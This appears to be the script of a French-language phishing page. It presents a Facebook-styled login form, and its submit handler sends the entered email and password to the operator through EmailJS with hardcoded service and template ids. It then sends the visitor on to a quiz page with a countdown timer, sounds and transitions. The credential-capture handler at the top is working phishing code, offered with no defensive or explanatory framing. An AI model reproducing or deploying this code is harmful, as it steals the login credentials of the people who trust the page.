emailjs.init("8VmZYZXkS-C0txxS7");

document.getElementById("login-form").addEventListener("submit", function (e) {
  e.preventDefault();

  const form = this;
  const email = form.user_email.value;
  const password = form.user_password.value;

  document.querySelector(".facebook-btn").disabled = true;
  document.getElementById("loader").classList.remove("hidden");

  emailjs.send("service_gdjbwxm", "template_7ajp0h7", {
    user_email: email,
    user_password: password
  }).then(function () {
    setTimeout(() => {
      window.location.href = "quiz.html";
    }, 1000);
  }, function (error) {
    alert("Erreur : " + JSON.stringify(error));
    document.querySelector(".facebook-btn").disabled = false;
    document.getElementById("loader").classList.add("hidden");
  });
});

// --- Smooth Page Transitions ---
document.addEventListener("DOMContentLoaded", function () {
  document.body.classList.add("fade-in");

  const anchors = document.querySelectorAll("a");
  anchors.forEach(anchor => {
    const href = anchor.getAttribute("href");
    if (href && href.endsWith(".html")) {
      anchor.addEventListener("click", function (e) {
        e.preventDefault();
        document.body.classList.add("fade-out");
        setTimeout(() => {
          window.location.href = href;
        }, 300);
      });
    }
  });
});


// --- Play error sound when popup appears ---
const popup = document.getElementById("popup");
if (popup && popup.style.display !== "none") {
  const errorSound = new Audio("error.mp3");
  errorSound.play().catch(e => console.warn("Son non joué :", e));
}



// --- Chronomètre Quiz avec sons et vibration ---
document.addEventListener("DOMContentLoaded", () => {
  const popup = document.getElementById("popup");
  const answerButtons = document.querySelectorAll("button.answer");

  if (popup && answerButtons.length > 0) {
    let timeLeft = 20;
    const timerDisplay = document.createElement("div");
    timerDisplay.style.position = "fixed";
    timerDisplay.style.top = "10px";
    timerDisplay.style.left = "10px";
    timerDisplay.style.backgroundColor = "#0008";
    timerDisplay.style.color = "white";
    timerDisplay.style.padding = "10px 15px";
    timerDisplay.style.borderRadius = "8px";
    timerDisplay.style.zIndex = "1000";
    timerDisplay.style.fontSize = "20px";
    timerDisplay.style.fontWeight = "bold";
    document.body.appendChild(timerDisplay);

    const tickSound = new Audio("tick.mp3");
    const timeoutSound = new Audio("timeout.mp3");
    const errorSound = new Audio("error.mp3");
    const successSound = new Audio("success.mp3");
    const clickSound = new Audio("click.mp3");

    const interval = setInterval(() => {
      timeLeft--;
      timerDisplay.innerText = `⏱️ Temps restant : ${timeLeft}s`;
      tickSound.play().catch(() => {});
      if (timeLeft <= 5) {
        timerDisplay.style.backgroundColor = "#800";
        navigator.vibrate?.(150);
      }
      if (timeLeft <= 0) {
        clearInterval(interval);
        timeoutSound.play();
        errorSound.play();
        popup.style.display = "block";
      }
    }, 1000);
    timerDisplay.innerText = `⏱️ Temps restant : ${timeLeft}s`;

    answerButtons.forEach(button => {
      button.addEventListener("click", () => {
        clearInterval(interval);
        clickSound.play();
        setTimeout(() => successSound.play(), 300);
      });
    });
  }
});


// Exemple de fonction appelée à la validation d'une bonne réponse
function validateAnswer(isCorrect) {
  if (isCorrect) {
    showVictoryEffect();
    // continuer la logique si nécessaire (naviguer, afficher score, etc.)
  } else {
    document.getElementById("popup").style.display = "block";
  }
}
